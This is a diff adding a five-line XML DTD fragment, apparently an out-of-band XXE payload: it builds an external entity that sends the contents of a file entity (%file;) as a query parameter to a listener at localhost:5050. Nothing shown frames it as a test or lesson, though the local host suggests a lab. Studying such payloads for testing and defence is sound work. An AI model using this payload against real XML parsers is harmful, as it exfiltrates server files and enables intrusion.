@@ -1,0 +1,5 @@
+﻿<!ENTITY % all
+	"<!ENTITY send SYSTEM
+	'http://localhost:5050/index.html?payload=%file;'>"
+>
+%all;
